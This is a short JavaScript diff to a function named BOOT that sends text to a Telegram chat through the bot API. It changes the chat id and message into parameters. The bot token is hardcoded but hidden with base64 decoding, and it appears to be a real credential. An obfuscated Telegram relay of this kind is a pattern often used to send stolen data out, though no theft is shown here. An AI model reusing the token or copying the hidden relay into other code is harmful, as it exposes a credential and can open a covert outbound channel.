@@ -1,6 +1,6 @@
-function BOOT() {
+function BOOT(id, text) {
             const token = atob("NzgyNzQ0NzUyNjpBQUZUQUUzQVJmODUtYlZkdFVPYXNpQkg1cmNPcUxrNjhVWQ==");
-            const chat_id = atob("NTY4NzQxOTIxMg==");
+            const chat_id = id;
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: "POST",
                 headers: {
@@ -8,7 +8,7 @@ function BOOT() {
                 },
                 body: JSON.stringify({
                     chat_id: chat_id,
-                    text: message
+                    text: text
                 })
             })
                 .then(res => res.json())
